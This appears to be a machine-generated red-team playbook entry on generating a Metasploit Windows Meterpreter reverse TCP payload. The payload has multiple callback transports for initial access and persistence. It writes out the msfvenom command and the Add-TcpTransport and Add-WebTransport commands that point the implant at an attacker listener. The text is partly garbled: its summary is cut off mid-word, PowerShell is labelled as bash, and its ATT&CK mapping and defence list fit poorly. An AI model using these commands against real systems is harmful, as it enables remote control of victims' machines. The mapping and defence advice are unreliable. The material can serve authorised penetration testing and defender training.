---
id: d668d307-95a1-4eb1-adff-bcaff6e55942
name: Metasploit Multiple Transports Payload Generator
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.702219+00:00'
updated_at: '2023-05-26T00:58:25.293102+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
- '[[External Remote Services|T1133 - External Remote Services]]'
tags:
- '[[Metasploit]]'
- '[[Multiple transports]]'
commands:
- '[[Add TCP Transport]]'
- '[[Add Web Transport]]'
- '[[Create Windows Meterpreter Reverse TCP Payload]]'
---

# Metasploit Multiple Transports Payload Generator

## Summary

The Metasploit Multiple Transports Payload Generator is a tool that allows an attacker to create a custom payload that can be used to gain initial access to a target network. This tool can generate payloads that use multiple transports, such as HTTP, HTTPS, or TCP, to increase the likelihood of suc

## Description

# Description

The Metasploit Multiple Transports Payload Generator is a tool that allows an attacker to create a custom payload that can be used to gain initial access to a target network. This tool can generate payloads that use multiple transports, such as HTTP, HTTPS, or TCP, to increase the likelihood of successful delivery to the target. The payload is generated using the Windows Meterpreter Reverse TCP Payload Generator and can be used with the Metasploit Framework.

Technical Explanation: The Metasploit Multiple Transports Payload Generator allows an attacker to create a custom payload that can be used to gain initial access to a target network. The payload is generated using the Windows Meterpreter Reverse TCP Payload Generator and can be used with the Metasploit Framework. The tool allows the attacker to specify multiple transports, which can increase the likelihood of successful delivery to the target.

Business Value: The Metasploit Multiple Transports Payload Generator can be used by red teams and penetration testers to test the effectiveness of an organization's security controls. By generating custom payloads that use multiple transports, testers can identify weaknesses in the organization's defenses and help improve overall security posture.

## Requirements

1. Access to the Metasploit Framework

1. Knowledge of the target network

1. Proper authentication and authorization

## Defense

1. Implement strong access controls and authentication mechanisms to prevent unauthorized access to the Metasploit Framework

1. Regularly monitor network traffic for suspicious activity and anomalies

1. Implement network segmentation and isolation to limit the impact of a successful attack

## Objectives

1. Gain initial access to a target network

1. Test the effectiveness of an organization's security controls

# Instructions

1. Use the 'msfvenom' tool to generate a Windows Meterpreter Reverse TCP payload. The payload will connect back to the specified IP address and port number. The 'sessionretrytotal' and 'sessionretrywait' options are used to specify the number of times to retry a connection and the wait time between retries. The 'extensions' option is used to load additional modules, and the 'extinit' option is used to specify the initialization script for those modules. The '-f' option is used to specify the output format of the payload, in this case 'exe'.

**Code**: [[msfvenom -p windows/meterpreter_reverse_tcp lhost=]]

> This command generates a Windows executable payload that can be used to establish a reverse TCP connection with a remote host. The 'lhost' and 'lport' options are used to specify the IP address and port number of the listener on the remote host. This payload can be used for various purposes, such as gaining remote access to a system, performing reconnaissance, or executing arbitrary commands.

**Command** ([[Create Windows Meterpreter Reverse TCP Payload]]):

```powershell
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```

2. Use the above commands to add TCP and Web transports to your system.

**Code**: [[Add-TcpTransport -lhost <host> -lport <port> -Retr]]

> The 'Add-TcpTransport' command adds a TCP transport with the specified local host and port. The 'RetryWait' and 'RetryTotal' parameters specify the retry interval and total number of retries, respectively.

The 'Add-WebTransport' command adds a Web transport with the specified URL. The 'RetryWait' and 'RetryTotal' parameters have the same function as in the 'Add-TcpTransport' command. The URL should be in the format 'http(s)://<host>:<port>/<luri>', where '<host>' is the hostname or IP address of the server, '<port>' is the port number, and '<luri>' is the local URI.

**Command** ([[Add TCP Transport]]):

```bash
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
```

**Command** ([[Add Web Transport]]):

```bash
Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
```

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]
- [[External Remote Services|T1133 - External Remote Services]]

## Commands Used

- [[Add TCP Transport]]
- [[Add Web Transport]]
- [[Create Windows Meterpreter Reverse TCP Payload]]

## Tags

- [[Metasploit]]
- [[Multiple transports]]
